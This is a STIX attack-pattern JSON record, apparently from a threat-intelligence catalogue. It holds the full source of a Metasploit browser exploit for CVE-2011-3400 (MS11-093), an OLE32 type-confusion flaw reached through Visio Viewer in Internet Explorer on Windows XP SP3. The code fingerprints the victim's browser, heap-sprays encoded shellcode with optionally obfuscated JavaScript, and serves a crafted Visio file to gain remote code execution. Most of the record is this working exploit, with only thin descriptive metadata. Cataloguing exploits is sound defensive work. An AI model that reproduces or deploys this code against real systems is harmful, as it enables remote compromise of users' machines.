{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c988393-9217-4021-8433-b5341d974206",
    "created": "2024-08-14T16:42:33.151494Z",
    "modified": "2024-08-14T16:42:33.151498Z",
    "name": "\"MS11-093 Microsoft Windows OLE Object File Handling Remote Code Execution\"",
    "description": " This module exploits a type confusion vulnerability in the OLE32 component of Windows XP SP3. The vulnerability exists in the CPropertyStorage::ReadMultiple function.  A Visio document with a specially crafted Summary Information Stream embedded allows to get remote code execution through Internet Explorer, on systems with Visio Viewer installed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms11_093_ole32.rb",
            "external_id": "ms11_093_ole32.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3400"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.org/adv/ole32_1-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=966"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS11-093 Microsoft Windows OLE Object File Handling Remote Code Execution\",\n      'Description'    => %q{\n          This module exploits a type confusion vulnerability in the OLE32 component of\n        Windows XP SP3. The vulnerability exists in the CPropertyStorage::ReadMultiple\n        function.\n\n        A Visio document with a specially crafted Summary Information Stream embedded allows\n        to get remote code execution through Internet Explorer, on systems with Visio Viewer\n        installed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Vulnerability discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'MSB', 'MS11-093'],\n          [ 'CVE', '2011-3400' ],\n          [ 'OSVDB', '77663'],\n          [ 'BID', '50977' ],\n          [ 'URL', 'http://aluigi.org/adv/ole32_1-adv.txt' ],\n          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=966' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3 / Visio Viewer 2010',\n            {\n              'Offset'    => '0x7ee - code.length',\n              'PtrToHeap' => \"\\x35\\x40\" # Pointer from IEXPLORE.exe PE header\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3 / Visio Viewer 2010',\n            {\n              'Offset'    => '0x7ee - code.length',\n              'PtrToHeap' => \"\\x35\\x40\" # Pointer from IEXPLORE.exe PE header\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-12-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    # If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  # IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  # IE 7 on Windows XP SP3\n    else\n      return nil\n    end\n  end\n\n  def exploit\n    @vsd = create_vsd\n    super\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Client requesting: #{request.uri}\")\n\n    if request.uri =~ /\\.vsd$/\n      @vsd[5106, 2] = my_target['PtrToHeap']\n      print_status(\"Sending Exploit VSD\")\n      send_response(cli, @vsd, { 'Content-Type' => 'application/vnd.visio' })\n      return\n    end\n\n    p = payload.encoded\n\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js_pivot = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var i=1; i < 0x1e0; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    js_pivot = heaplib(js_pivot, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js_pivot = ::Rex::Exploitation::JSObfu.new(js_pivot)\n      js_pivot.obfuscate(memory_sensitive: true)\n    end\n\n    vsd_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource\n    vsd_uri << \"/#{rand_text_alpha(rand(6)+3)}.vsd\"\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js_pivot}\n    </script>\n    </head>\n    <body>\n\n    <object classid=\"clsid:F8CF7A98-2C45-4c8d-9151-2D716989DDAB\" ID=\"target\">\n    <param name=src value=\"#{vsd_uri}\">\n    </object>\n    </body>\n    </html>\n    |\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\n  def create_vsd\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2011-3400\", \"CVE-2011-3400.vsd\" )\n    fd = ::File.open( path, \"rb\" )\n    vsd = fd.read(fd.stat.size)\n    fd.close\n    return vsd\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2011-12-13",
    "x_mitre_platforms": [
        "win'"
    ]
}